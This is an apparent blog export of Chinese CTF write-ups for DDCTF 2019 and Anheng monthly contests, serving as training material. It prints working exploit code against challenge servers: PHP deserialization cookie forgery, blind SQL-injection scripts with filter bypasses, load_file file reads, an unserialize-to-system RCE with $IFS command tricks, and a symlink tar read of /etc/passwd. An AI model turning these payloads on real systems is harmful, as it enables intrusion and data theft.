签到题\n\n题目需要我们以admin身份登录，查看网络信息发现一个中间页面Auth.php，在该请求头中看到了didictf_username字段，猜测修改该字段即可以admin身份登录，抓包修改一下\n\n![](https://i.loli.net/2019/05/20/5ce296dc16dc917104.png)\n\n即可以admin身份登录\n\n![](https://i.loli.net/2019/05/20/5ce297062e1c059824.png)\n\n访问该页面可以看到两个源码\n\nhttp://117.51.158.44/app/fL2XID2i0Cdh.php\n\n```php\n//url:app/Application.php\n\nClass Application {\n    var $path = '';\n\n\n    public function response($data, $errMsg = 'success') {\n        $ret = ['errMsg' => $errMsg,\n            'data' => $data];\n        $ret = json_encode($ret);\n        header('Content-type: application/json');\n        echo $ret;\n\n    }\n\n    public function auth() {\n        $DIDICTF_ADMIN = 'admin';\n        if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) {\n            $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');\n            return TRUE;\n        }else{\n            $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error');\n            exit();\n        }\n\n    }\n    private function sanitizepath($path) {\n    $path = trim($path);\n    $path=str_replace('../','',$path);\n    $path=str_replace('..\\\\','',$path);\n    return $path;\n}\n\npublic function __destruct() {\n    if(empty($this->path)) {\n        exit();\n    }else{\n        $path = $this->sanitizepath($this->path);\n        if(strlen($path) !== 18) {\n            exit();\n        }\n        $this->response($data=file_get_contents($path),'Congratulations');\n    }\n    exit();\n}\n}\n\n//url:app/Session.php\n\ninclude 'Application.php';\nclass Session extends Application {\n\n    //key建议为8位字符串\n    var $eancrykey                  = '';\n    var $cookie_expiration\t\t\t= 7200;\n    var $cookie_name                = 'ddctf_id';\n    var $cookie_path\t\t\t\t= '';\n    var $cookie_domain\t\t\t\t= '';\n    var $cookie_secure\t\t\t\t= FALSE;\n    var $activity                   = \"DiDiCTF\";\n\n\n    public function index()\n    {\n\tif(parent::auth()) {\n            $this->get_key();\n            if($this->session_read()) {\n                $data = 'DiDI Welcome you %s';\n                $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']);\n                parent::response($data,'sucess');\n            }else{\n                $this->session_create();\n                $data = 'DiDI Welcome you';\n                parent::response($data,'sucess');\n            }\n        }\n\n    }\n\n    private function get_key() {\n        //eancrykey  and flag under the folder\n        $this->eancrykey =  file_get_contents('../config/key.txt');\n    }\n\n    public function session_read() {\n        if(empty($_COOKIE)) {\n        return FALSE;\n        }\n\n        $session = $_COOKIE[$this->cookie_name];\n        if(!isset($session)) {\n            parent::response(\"session not found\",'error');\n            return FALSE;\n        }\n        $hash = substr($session,strlen($session)-32);\n        $session = substr($session,0,strlen($session)-32);\n\n        if($hash !== md5($this->eancrykey.$session)) {\n            parent::response(\"the cookie data not match\",'error');\n            return FALSE;\n        }\n        $session = unserialize($session);\n\n\n        if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){\n            return FALSE;\n        }\n\n        if(!empty($_POST[\"nickname\"])) {\n            $arr = array($_POST[\"nickname\"],$this->eancrykey);\n            $data = \"Welcome my friend %s\";\n            foreach ($arr as $k => $v) {\n                $data = sprintf($data,$v);\n            }\n            parent::response($data,\"Welcome\");\n        }\n\n        if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) {\n            parent::response('the ip addree not match'.'error');\n            return FALSE;\n        }\n        if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) {\n            parent::response('the user agent not match','error');\n            return FALSE;\n        }\n        return TRUE;\n\n    }\n\n    private function session_create() {\n        $sessionid = '';\n        while(strlen($sessionid) < 32) {\n            $sessionid .= mt_rand(0,mt_getrandmax());\n        }\n\n        $userdata = array(\n            'session_id' => md5(uniqid($sessionid,TRUE)),\n            'ip_address' => $_SERVER['REMOTE_ADDR'],\n            'user_agent' => $_SERVER['HTTP_USER_AGENT'],\n            'user_data' => '',\n        );\n\n        $cookiedata = serialize($userdata);\n        $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);\n        $expire = $this->cookie_expiration + time();\n        setcookie(\n            $this->cookie_name,\n            $cookiedata,\n            $expire,\n            $this->cookie_path,\n            $this->cookie_domain,\n            $this->cookie_secure\n            );\n\n    }\n}\n$ddctf = new Session();\n$ddctf->index();\n```\n\n查看session.php代码可知，主要逻辑在session_read和session_create两个功能，session_create建立cookie并签名，session_read验证签名然后反序列化，而在Session类继承的__destruct方法中存在文件读取，所以本题的思路就是利用反序列化来读取flag。\n为了破解签名，我们需要知道eancrykey，题目中存在如下代码\n\n```php\nif(!empty($_POST[\"nickname\"])) {\n    $arr = array($_POST[\"nickname\"],$this->eancrykey);\n    $data = \"Welcome my friend %s\";\n    foreach ($arr as $k => $v) {\n        $data = sprintf($data,$v);\n    }\n    parent::response($data,\"Welcome\");\n}\n```\n\n该段代码将eancrykey也放进了数组中，所以我们可以利用nickname中的%s将其输出，例如：\n```php\n$key = 'aesm1p';\n$arr = array('snow %s',$key);\n$data = \"welcome %s\";\nforeach ($arr as $k => $v) {\n\t$data = sprintf($data,$v);\n}\necho $data;\n```\n\n可以得到结果\n\n```\nwelcome snow aesm1p\n```\n\n提交的时候必须要加上didictf_username头\n\n![](DDCTF2019/1.png)\n\n成功读取到秘钥值为`EzblrbNS`，接下里就是反序列化，代码如下：\n\n```php\nclass Session {\n\tvar $path = '';\n}\n\n$key = 'EzblrbNS';\n$a = new Session();\n$a->path = '..././config/flag.txt';\n\n$cookiedata = serialize($a);\n$cookiedata = $cookiedata.md5($key.$cookiedata);\necho $cookiedata.'  ';\necho urlencode($cookiedata);\n```\n\n修改cookie即可得到flag\n\n![](DDCTF2019/2.png)\n\nflag: `DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}`\n\n# Upload-IMG\n\n我们上传之后的图片会被二次渲染，查看返回的图片可以看到`gd-jpeg v1.0`，是php的gd库渲染的，本题的考点是gd二次渲染绕过，要求我们将payload\n[phpinfo();]写入图片中，可以用工具跑一下（修改写入的payload），然后就会生成符合条件的图片\n\n```\nphp jpg_payload.php imga_name\n```\n\nPS：可能需要多次才能成功，试一些比较大的图片成功率高，还有就是在linux下做，不要在windows下进行尝试\n\n然后提交图片即可\n\nflag：`DDCTF{B3s7_7ry_php1nf0_57d79f001ace9fad}`\n\n# homebrew event loop\n\n源代码如下\n\n```python\n# -*- encoding: utf-8 -*-\n# written in python 2.7\n__author__ = 'garzon'\n\nfrom flask import Flask, session, request, Response\nimport urllib\n\napp = Flask(__name__)\napp.secret_key = '*********************' # censored\nurl_prefix = '/d5af31f66147e657'\n\ndef FLAG():\n    return 'FLAG_is_here_but_i_wont_show_you'  # censored\n    \ndef trigger_event(event):\n    session['log'].append(event)\n    if len(session['log']) > 5: session['log'] = session['log'][-5:]\n    if type(event) == type([]):\n        request.event_queue += event\n    else:\n        request.event_queue.append(event)\n\ndef get_mid_str(haystack, prefix, postfix=None):\n    haystack = haystack[haystack.find(prefix)+len(prefix):]\n    if postfix is not None:\n        haystack = haystack[:haystack.find(postfix)]\n    return haystack\n    \nclass RollBackException: pass\n\ndef execute_event_loop():\n    valid_event_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#')\n    resp = None\n    while len(request.event_queue) > 0:\n        event = request.event_queue[0] # `event` is something like \"action:ACTION;ARGS0#ARGS1#ARGS2......\"\n        request.event_queue = request.event_queue[1:]\n        if not event.startswith(('action:', 'func:')): continue\n        for c in event:\n            if c not in valid_event_chars: break\n        else:\n            is_action = event[0] == 'a'\n            action = get_mid_str(event, ':', ';')\n            args = get_mid_str(event, action+';').split('#')\n            try:\n                event_handler = eval(action + ('_handler' if is_action else '_function'))\n                ret_val = event_handler(args)\n            except RollBackException:\n                if resp is None: resp = ''\n                resp += 'ERROR! All transactions have been cancelled. <br />'\n                resp += '<a href=\"./?action:view;index\">Go back to index.html</a><br />'\n                session['num_items'] = request.prev_session['num_items']\n                session['points'] = request.prev_session['points']\n                break\n            except Exception, e:\n                if resp is None: resp = ''\n                #resp += str(e) # only for debugging\n                continue\n            if ret_val is not None:\n                if resp is None: resp = ret_val\n                else: resp += ret_val\n    if resp is None or resp == '': resp = ('404 NOT FOUND', 404)\n    session.modified = True\n    return resp\n    \n@app.route(url_prefix+'/')\ndef entry_point():\n    querystring = urllib.unquote(request.query_string)\n    request.event_queue = []\n    if querystring == '' or (not querystring.startswith('action:')) or len(querystring) > 100:\n        querystring = 'action:index;False#False'\n    if 'num_items' not in session:\n        session['num_items'] = 0\n        session['points'] = 3\n        session['log'] = []\n    request.prev_session = dict(session)\n    trigger_event(querystring)\n    return execute_event_loop()\n\n# handlers/functions below --------------------------------------\n\ndef view_handler(args):\n    page = args[0]\n    html = ''\n    html += '[INFO] you have {} diamonds, {} points now.<br />'.format(session['num_items'], session['points'])\n    if page == 'index':\n        html += '<a href=\"./?action:index;True%23False\">View source code</a><br />'\n        html += '<a href=\"./?action:view;shop\">Go to e-shop</a><br />'\n        html += '<a href=\"./?action:view;reset\">Reset</a><br />'\n    elif page == 'shop':\n        html += '<a href=\"./?action:buy;1\">Buy a diamond (1 point)</a><br />'\n    elif page == 'reset':\n        del session['num_items']\n        html += 'Session reset.<br />'\n    html += '<a href=\"./?action:view;index\">Go back to index.html</a><br />'\n    return html\n\ndef index_handler(args):\n    bool_show_source = str(args[0])\n    bool_download_source = str(args[1])\n    if bool_show_source == 'True':\n    \n        source = open('eventLoop.py', 'r')\n        html = ''\n        if bool_download_source != 'True':\n            html += '<a href=\"./?action:index;True%23True\">Download this .py file</a><br />'\n            html += '<a href=\"./?action:view;index\">Go back to index.html</a><br />'\n            \n        for line in source:\n            if bool_download_source != 'True':\n                html += line.replace('&','&amp;').replace('\\t', '&nbsp;'*4).replace(' ','&nbsp;').replace('<', '&lt;').replace('>','&gt;').replace('\\n', '<br />')\n            else:\n                html += line\n        source.close()\n        \n        if bool_download_source == 'True':\n            headers = {}\n            headers['Content-Type'] = 'text/plain'\n            headers['Content-Disposition'] = 'attachment; filename=serve.py'\n            return Response(html, headers=headers)\n        else:\n            return html\n    else:\n        trigger_event('action:view;index')\n        \ndef buy_handler(args):\n    num_items = int(args[0])\n    if num_items <= 0: return 'invalid number({}) of diamonds to buy<br />'.format(args[0])\n    session['num_items'] += num_items \n    trigger_event(['func:consume_point;{}'.format(num_items), 'action:view;index'])\n    \ndef consume_point_function(args):\n    point_to_consume = int(args[0])\n    if session['points'] < point_to_consume: raise RollBackException()\n    session['points'] -= point_to_consume\n    \ndef show_flag_function(args):\n    flag = args[0]\n    #return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.\n    return 'You naughty boy! ;) <br />'\n    \ndef get_flag_handler(args):\n    if session['num_items'] >= 5:\n        trigger_event('func:show_flag;' + FLAG()) # show_flag_function has been disabled, no worries\n    trigger_event('action:view;index')\n    \nif __name__ == '__main__':\n    app.run(debug=False, host='0.0.0.0')\n```\n\n这是一个flask系统，但是却与普通的flask系统不同，正常flask系统是通过`app.route`来编写路由的，而本题中却是维护了一个事件队列来进行路由，按照先进先出的规则处理事件，通过分割我们输入的查询字符串来处理事件，通读代码我们可以发现存在一个敏感函数eval()\n\n```python\nevent_handler = eval(action + ('_handler' if is_action else '_function'))\nret_val = event_handler(args)\n```\n\n其实此处可以不使用eval函数的，而且由于action参数可控，导致我们可以注入恶意函数进去（用#注释掉action后面的内容），比如\n\n```python\naction,is_action = 'int#',False\nevent_handler = eval(action + ('_handler' if is_action else '_function'))\n# ret_val = event_handler(args)\nprint event_handler(1.1)\n```\n\n此时可以成功执行int函数\n\n想要得到flag的话需要调用`get_flag_hander()`函数，查看代码可知需要`session['num_items'] >= 5`即可将flag写入session，此处需要我们购买5个钻石\n\n```python\ndef buy_handler(args):\n    num_items = int(args[0])\n    if num_items <= 0: return 'invalid number({}) of diamonds to buy<br />'.format(args[0])\n    session['num_items'] += num_items \n    trigger_event(['func:consume_point;{}'.format(num_items), 'action:view;index'])\n```\n\n查看此处代码发现存在明显的逻辑问题，即购买时系统先完成购买`session['num_items'] += num_items`，然后才触发事件检验金额是否足够`trigger_event(['func:consume_point;{}'.format(num_items), 'action:view;index'])`，如果不够的话进行回滚，这样的话在该回滚事件执行之前我们可以短暂的成功购买，此时执行get_flag函数即可成功执行，我们可以构建一个这样的事件队列\n\n```\nbuy->get_flag->consume_point\n```\n\n结合上面的eval函数漏洞，我们可以实现该攻击，trigger_event函数可以将事件插入队列，我们可以利用该函数将buy和get_flag函数插入队列\n\n![](DDCTF2019/3.png)\n\n解密session即可得到flag\n\nflag: `DDCTF{3v41_3v3nt_1O0p_aNd_fLASK_cOOk1e}`\n\n","tags":["CTF","Web"],"categories":["复现"]},{"title":"安恒月赛复现集合","url":"/2020/09/13/month-race/","content":"\n\n历史文章补发\n\n部分安恒月赛题目的复现记录\n\n<!--more-->\n\n# 5月月赛\n\n## crypto&misc\n\n地址:https://pan.baidu.com/s/1RB1w5wHuk8bnNShHGaqqVg   提取码：259q\n\n### baby_writeup\n\n拿到题目先strings一下，发现有个flag{}字样，然后在IDA打开，ctrl+1查找string字符串，找到之后F5反编译一下，记得要找到函数入口，看到代码\n\n```\nfgets(s, 17, stdin);\nif ( strlen(s) != 16 )\nexit(0);\nsub_400756(s, &v6);\nfor ( i = 0; i < strlen(v6); ++i )\n{\nif ( byte_601100[(signed __int64)i] != v6[i] )\n  exit(0);\n}\nprintf(\"Flag{%s}\\n\", s);\n```\n\n可以看到题目是输入一个长度为16的字符串(因为字符串结尾还有一个结束符要占据一位)，然后经过校验之后输出，说明输入的原来就是flag，找到byte_601100内存中的内容，把16进制提取出来\n\n```\n6DAB1EEB88B9B6179B7ACB7E \n```\n\n猜测它要不是hex要不是base64，尝试一下发现是base64，转换之，需要先进行ascii2hex的转换，这个不理解为什么，然后运行即可得到flag\n\n```\nroot@kali:~/Desktop# ./5aff787616ad1 \nbase64i5thebest+\nFlag{base64i5thebest+}\n```\n\n### RSA\n\n这题真是佩服他们的搜索能力，原来还可以这么玩（2333.），打开代码发现是已知n,e求d获取flag\n\n```python\nN = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471\ne = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085\n\nimport hashlib\nflag = \"flag{\" + hashlib.md5(hex(d)).hexdigest() + \"}\"\n```\n\n观察可知本体的e非常大，所以百度搜索 ```rsa攻击e很大```  在第一条结果里面居然就找到思路！！本题是wiener-attack，还附上了github代码，直接copy下来用就可以了，可以得到d的值，代入上述代码中即可得到flag\n\n### 洞拐洞拐洞洞拐\n\n打开图片放大观察发现每一个小像素都是或黑或白的小方块,所以可以把黑色看成1白色看成0转换一下\n\n```python\nfrom PIL import Image\nimport re\nimport base64\n\nim = Image.open('5aff787f5d6f2.png')\npix = im.load()\nwidth = im.size[0]\nheight = im.size[1]\nflag = ''\nfor x in range(width):\n    for y in range(height):\n        r,g,b = pix[x,y]\n        if r == 255:\n            flag += '0'\n        else:\n            flag += '1'\ncontent = re.findall(r'.{8}',flag)\nnflag = ''\n\nfor item in content:\n    nflag += chr(int(item,2))\n\nflag = base64.b16decode(nflag)\nopen('1.wav','wb').write(flag)\n```\n\n处理wav文件，可以用一个Audacity工具，网上有在线版，分析文件，发现文件波形长度应该是八进制文件，分析一下\n\n```python\nimport wave\nimport numpy as np\nimport re \nimport base64\n\nfile = '1.wav'\nwavefile = wave.open(file,'r')\nnumframes = wavefile.getnframes()\nstrdata = wavefile.readframes(numframes)\nwavedata = np.fromstring(strdata,dtype=np.int16)\nwavedata = wavedata * 1.0 / (max(abs(wavedata)))\ndatas = []\nfor i in range(0,len(wavedata),10):\n    datas.append(wavedata[i])\n\nstrs = ''\nfor data in datas:\n    x = \"%0.2f\" % data\n    strs += str(int((float(x) + 1.0)/0.25) - 1)\n\ntt = re.findall(r'.{3}',strs)\nflag = ''\nfor t in tt:\n    flag += chr(int(t,8))\n# print flag\nprint base64.b32decode(flag+\"======\")\n```\n\n处理一下就可以得到flag，这题真的是头铁，还是我太菜了。。\n\n# 7月月赛\n\n## web\n\n### web02 就是这么直接\n\n这题目我觉得就是脑洞题，题目给出了提示代码，其中有md5函数，可能是提示我们本题和md5有关，其实本题思路就是先提交一个md5值，题目会返回 ```emmm我觉得答案是啥呢？``` 查看元素可以看到后面还加了一串md5值，将这段md5再次提交，重复这个过程，直到得到flag，代码如下：\n\n```python\nimport requests\nimport re\n\nurl =  'http://101.71.29.5:10002/flag.php'\npayload = {'answer':'c36af63f87acebba1c23498809db7537'}\n\nwhile True:\n    content = requests.post(url,payload).content.decode('utf-8')\n    if 'flag' in content:\n        print(content)\n        break\n    new = re.findall('<!--[0-9a-z]{10,}-->',content)\n    payload = {'answer': new[0][4:-3]}\n```\n\n### web03 简历来了\n\n这个题目考察的是CSRF相关的知识点\n\n/upload/73e0669ac68ffcb28aed0c48b0924a42.jpg\nhttp://138.68.29.92:8888/ContentHijackingLoader.html?objfile=http://127.0.0.1/upload/73e0669ac68ffcb28aed0c48b0924a42.jpg&objtype=flash&target=http://127.0.0.1/admin&postdata=&logmode=result&regex=&isauto=1\n\n## MISC\n\n链接：https://pan.baidu.com/s/1kqOTuqtJsW6PK4ob2_VqNg   密码：m97g\n\n### 0x01-弱口令 \n\n这题比较坑，题目是个压缩包，解压需要密码，打开压缩包之后发现有一段不可见文本，复制一下在sublime中打开发现是摩斯密码，解密一下 ```HELL0FORUM``` ，解压这个压缩包，发现一张图片，一道基本的LSB色道隐写，用脚本跑一下即可\n\n```\npython lsb.py extract aa.png 1.txt 123456\n```\n\n```123456``` 是弱口令\n\n### 0X02-浏览图片的时候刷新键有没有用呢 \n\n由刷新可以联想到这题考察的是F5算法，网上查找解密算法\n\n```\njava Extract Misc.jpg\n```\n\n可以得到一个文本文件，看文件前缀发现是zip文件前缀，修改文件后缀为zip即可，zip文件还有一层伪加密，之后解密即可得到flag\n\n### 0x03-到底为了什么 \n\n```\nhttp.request.uri contains \"pma\"\n```\n\n[](month_race/1.png)\n\n可以看到有一条修改密码的命令，继续浏览发现应该是一个csrf攻击的流量包，网上查找cve编号\n\n[](month_race/2.png)\n\n计算flag\n\n```php\n<?php\n$con = strtolower(\"CVE-2017-1000499_CWE-352_2018-06-15 09:40:12\");\necho md5($con);\n?>\n```\n\n# 十月月赛\n\n## web\n\n### 好黑的黑名单\n\n随便测试可以发现数据库名长度为3\n\n```\nhttp://101.71.29.5:10008/show.php?id=0||if((length(database())-3),1,0)\n```\n\n题目过滤了分号，单引号，但是regexp没有被过滤，可以使用regexp来绕过，可知数据库名为web\n\n```\nhttp://101.71.29.5:10008/show.php?id=if((database()regexp(0x776562)),1,2)\n```\n\n然后爆库名，但是=号被过滤了，但是可以用in来绕过，比如这样\n\n```sql\nselect 1 in (1,2,3,4)\n```\n\n空格也被过滤了，可以用%0a绕过，还有information.schema.tables也被过滤了，可以用information_schema%0a.%0atables来绕过，代码如下\n\n```python\nimport requests\n\nurl = \"http://101.71.29.5:10008/show.php?id=\"\ntest = \"0123456789qwertyuiopasdfghjklzxcvbnm,\\{|\\}~\"\ntable = \"if(((select%0agroup_concat(table_name)%0afrom%0ainformation_schema%0a.%0atables%0awhere%0atable_schema%0ain%0a(database()))regexp(0x{})),1,2)\"\n# table_name:admin,flaggg,menu\ncolumn = \"if(((select%0agroup_concat(column_name)%0afrom%0ainformation_schema%0a.%0acolumns%0awhere%0atable_name%0ain%0a(0x666c61676767))regexp(0x{})),1,2)\"\n# id,f1agg\ncontent = \"if(((select%0af1agg%0afrom%0aflaggg)regexp(0x{})),1,2)\"\npayload = \"5e\"\nflag = \"\"\nflagdic = \"0123456789abcdeflag.\"\nfor i in range(50):\n    for s in flagdic:\n        temp = hex(ord(s))[2:4]\n        # print(url+table.format(payload+temp))\n        res = requests.get(url+content.format(payload+temp)).text\n        if \"郑州烩面\" in res:\n            if temp == \"7b\":\n                payload += \"2e\"\n            else:\n                payload += temp;\n            flag += chr(int(temp,16))\n            print(payload)\n            print(flag)\n            break\n        elif \"油泼面\" in res:\n            continue;\n        else:\n            print(\"error\")\n```\n\n看了学长的博客说regexp在匹配flag的时候只能到flag{之后就会报错，这是由于正则表达式中{}是有特殊含义的，所以会报错，我们用 `.` 来代替{}就可以了\n\n![](month-race/10.png)\n\n### ezsql\n\n注入题目，注册账号登录进去查看用户信息时id参数存在注入，需要用到load_file函数，wp里面用了if函数，但是这题我使用的异或运算符^\n\n```python\nimport requests\n\ndic = \"0123456789ABCDEF\"\nurl = \"http://101.71.29.5:10015/user/user.php?id=\"\nfile = open('1.txt','w')\ncookie = {\"PHPSESSID\": \"8lvl1ukppvqs2ovi8n0a2lu4g5\"}\n# index.php\nindex = \"0^(hex(load_file(0x2f7661722f7777772f68746d6c2f696e6465782e706870)) like 0x{}25)\" \nconfig = \"0^(hex(load_file(0x2f7661722f7777772f68746d6c2f636f6e6669672f636f6e6669672e706870)) like 0x{}25)\" \npayload = \"\"\ncontent = \"\"\nfor i in range(10000):\n    for item in dic:\n        temp = hex(ord(item))[2:4]\n        # print(url+index.format(payload+temp))\n        res = requests.get(url+config.format(payload+temp),cookies=cookie).text\n        if \"admin\" in res:\n            payload += temp\n            content += item\n            file.writelines(payload)\n            file.writelines(content)\n            print(payload)\n            print(content)\n            break\n```\n\n可以得到index.php的代码为\n\n```php\n<?php \nrequire_once('config/sys_config.php');\nrequire_once('header.php');\nif(isset($_COOKIE['CONFIG'])){\n    $config = $_COOKIE['CONFIG'];\n    require_once('config/config.php');\n}\n?>\n```\n\n再读config.php\n\n```php\n<?php\n$config = unserialize(base64_decode($config));\nif(isset($_GET['p'])){\n    $p=$_GET['p'];    \n    $config->$p;\n}\nclass Config{\n    private $config;\n    private $path;\n    public $filter;\n    public function __construct($config=\"\"){\n        $this->config = $config;\n        echo 123;\n    }\n    public function getConfig(){\n        if($this->config == \"\"){\n            $config = isset($_POST['config'])?$_POST['config']:\"\";\n        }\n    }\n    public function SetFilter($value){\n        //        echo $value;\n        $value=waf_exec($value); \n        var_dump($value);\n        if($this->filter){\n        foreach($this->filter as $filter){\n            $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);\n        }\n        $this->filter = array();\n        }else{\n            return false;\n        }\n        return true;\n    }\n    public function __get($key){\n        //var_dump($key);\n        $this->SetFilter($key);\n        die(\"\");\n    }\n}\n```\n\n可以看到在__get()函数，该函数是类在访问私有成员的时候会自动调用这个方法，具体机制还需要研究，然后这里与setfilter函数利用反序列化可以构成rce，在cookie中写入序列化值\n\n```php\n$snow = new Config();\n$snow->filter = array('system');\necho base64_encode(serialize($snow));\n```\n\n然后访问\n\n```\nhttp://101.71.29.5:10015/index.php?p=ls\n```\n\n发现即可列目录，但是由于过滤了空格和/，所以无法读文件，空格可以使用$IFS绕过，然后利用grep命令来读\n\n```\nhttp://101.71.29.5:10015/index.php?p=grep$IFS-ri$IFS.$IFSflag\n```\n\n这个不理解，需要后续再学习\n\n在附上官方解法，待研究\n\n![](month-race/11.png)\n\n\n### interesting web \n\n题目是一个flask框架，题目了修改密码功能，思路是修改admin的密码，flask框架中session\n是存储在浏览器端的，虽然不能伪造但是可以破解，我们\n\n```\neyJsb2dpbiI6dHJ1ZSwidG9rZW4iOnsiIGIiOiJaamRrWlRaa1l6QmlZVEV4TlRVMU5UWTVaVFV3Wmpaak16ZGxNVFU1TURVPSJ9LCJ1c2VybmFtZSI6ImFkbWluIn0.DuKTNg.LtfGK8IX-4fJ6WO-6mcVJsU2hdI\n```\n\n第一个.号之前的内容是base64编码的，直接解密就可以了\n\n```\n{\"login\":true,\"token\":{\" b\":\"ZjdkZTZkYzBiYTExNTU1NTY5ZTUwZjZjMzdlMTU5MDU=\"},\"username\":\"admin\"}\n```\n\n再将b的值base64解码就可以得到token了，然后修改密码，以admin身份登录，然后利用软链接来读取文件\n\n```bash\nln -s /etc/passwd 1.jpg\ntar cvfp shell.tat 1.jpg\n```\n\n然后上传在访问图片，下载之，修改后缀为txt查看即可得到flag\n\n## Crypt\n\n### 仿射\n\n仿射密码，题目已经给出了b的值，对于仿射密码来说\n\n加密过程为\n\n> y≡e(x)≡a(x)+b(mod26)\n\n解密过程\n\n> x ≡ d(e(x)) ≡ a'(e(x)-b)(mod26)         # a'为a的逆，在26以内是有限的\n\n我们只需要爆破即可\n\n```python\nc = \"achjbnpdfherebjsw\"\nb=7\nflag = \"\"\nfor i in (1,9,21,15,3,19,7,23,11,5,17,25):\n    for s in c:\n        seq = (i*((ord(s)-ord('a'))-b)) % 26\n        flag += chr(ord('a')+seq)\n    print(flag)\n    flag = \"\"\n```\n\n然后即可找到flag\n\n![](month-race/12.png)\n\n<!-- youareright -->\n\n## MISC\n\n### MISC1\n\n题目如下\n\n> 中华文化博大精深，近日在教小外甥学习1-110之间的数字，可是小外甥比较调皮，不好好学，于是灵机一动，想到一个容易记忆，并且还可以识字的好办法，你知道我想出了什么办法吗？下边是在教外甥学习的一部分内容，你知道分别代表什么意思吗？\n>\n>（企鹅，青蛙，油漆，花旗参，救生圈，油漆，二胡，二石，漏斗，二石，二石，冰淇淋，漏斗，喇叭，油漆，冰淇淋，鹅卵石，21世纪，耳机，油漆，耳机，二石，二胡，耳机，21世纪，企鹅，二流子，二石，要发，二石，冰淇淋，冰淇淋，油漆，冰淇淋，企鹅，乔丹，二石，酒壶）\n\n这是一种数字密码表，好像叫110数字记忆表，是帮助提高记忆力的\n\n直接网上找对应的值然后脚本，获取数字之后，每个数字的加30取ascii码值就是flag\n\n```python\ncipher = (\"企鹅\",\"青蛙\",\"油漆\",\"花旗参\",\"救生圈\",\"油漆\",\"二胡\",\"二石\",\"漏斗\",\"二石\",\"二石\",\"冰淇淋\",\"漏斗\",\"喇叭\",\n\"油漆\",\"冰淇淋\",\"鹅卵石\",\"21世纪\",\"耳机\",\"油漆\",\"耳机\",\"二石\",\"二胡\",\"耳机\",\"21世纪\",\"企鹅\",\"二流子\",\"二石\",\"要发\",\n\"二石\",\"冰淇淋\",\"冰淇淋\",\"油漆\",\"冰淇淋\",\"企鹅\",\"乔丹\",\"二石\",\"酒壶\")\n\ndic = {\"企鹅\":72,\"青蛙\":78,\"油漆\":67,\"花旗参\":73,\"救生圈\":93,\"二胡\":25,\"二石\":20,\"漏斗\":69,\"喇叭\":68,\"冰淇淋\":70,\n\"鹅卵石\":24,\"21世纪\":21,\"耳机\":27,\"二流子\":26,\"要发\":18,\"乔丹\":23,\"酒壶\":95}\n\nnums = \"\"\nfor item in cipher:\n    temp = dic.get(item)\n    nums += str(temp)\nflag = \"\"\nfor i in range(len(nums)//2):\n    flag += chr(int(nums[2*i:2*i+2])+30)\nprint(flag)\n```\n\n# 12月月赛\n\n## MISC\n\n### 签到题\n\n关注公主号，回复flag会返回一个问题 `什么牛不会跑` ，答案是 `蜗牛` ,然后即可得到flag\n\n<!-- flag{6ef1b2246e5e651a46bfa51cfa71b763} -->\n\n### 学习资料\n\n尝试爆破，但是爆破了好久都没有成功，最终无奈看了一下题解，解开压缩包，之后就是docx隐写，在设置中显示隐藏文字即可。\n\n<!-- Flag{edaa144c91a4e5b817e4a18cbdb78879} -->\n\n### 变换的指纹\n\n用CSDN密码库密码爆破。我失败了，看了别人的密码`!(()!@)6125dou `（注意结尾的空格），之后即可得到压缩包，\n\n23685528276158852365572716835687172857481317\n\n### JUJU\n\n题目提示了说`11只JUJU`，但是图片中却不够11个，可知是图片高度的问题，修改一下图片高度\n\n![](https://i.loli.net/2019/01/17/5c40908a8abf5.png)\n\n然后即可看到类似base64编码的字符串`MZWGCZ33GQZTQMTEM5SGMMTEPU====`，但是解码失败，尝试后发现是base32编码的，解密即可得到flag`flag{4382dgdf2d}`\n\n### 菜刀666\n\n先随便查看http流量，在最后的流量中发现了压缩包的传输，查看流量大致可以看到黑客是不断探测目录，最终探测出了flag坐在目录，向服务器请求了hello.zip的文件内容，将文件提取出来，发现在文件末尾有提示文字`well,you need passwd!`，可知zip压缩包基本不可能是伪加密，应该是需要密码的，再次查看流量包，发现一条超长的http的数据包，发现一段jpg图片的十六进制，提取存储为jpg图片\n\n![](https://i.loli.net/2019/01/18/5c41e9b279481.png)\n\n打开图片即可看到密码，解压即可看到flag\n\n<!-- flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z} -->\n\n## WEB\n\n\n### easy\n\n代码审计，关键过滤如下\n\n```php\npreg_match('/[oc]:\\d+:/i',$data,$matches);\n```\n\n可以看到是为了防止object类的序列化，但是过滤不够严谨，可以用 `+` 绕过 `o:14 -> o:+14` \n\n```php\n<?php \n@error_reporting(1);\nclass baby \n{   \n    public $file;\n    function __toString()      \n    {          \n        if(isset($this->file)) \n        {\n            $filename = \"./{$this->file}\";        \n            if (file_get_contents($filename))         \n            {              \n                return file_get_contents($filename); \n            } \n        }     \n    }  \n}  \n$data = new baby();\n$data->file = \"flag.php\";\nprint(serialize(($data)));//给输出加一个加号在url编码一下\n```\n\npayload\n\n```\nhttp://101.71.29.5:10007/?data=O%3A%2B4%3A%22baby%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D\n```\n\n<!-- flag{ad2328a2c3f0933c053fd3c6f28f6143} -->\n\n### ezweb2\n\n既然是渗透测试，扫描一下目录，发现存在admin.php，登录后返回 `you are not admin.` ，查看cookie发现user值为`user`的base64值，我们将此值修改为 `admin` 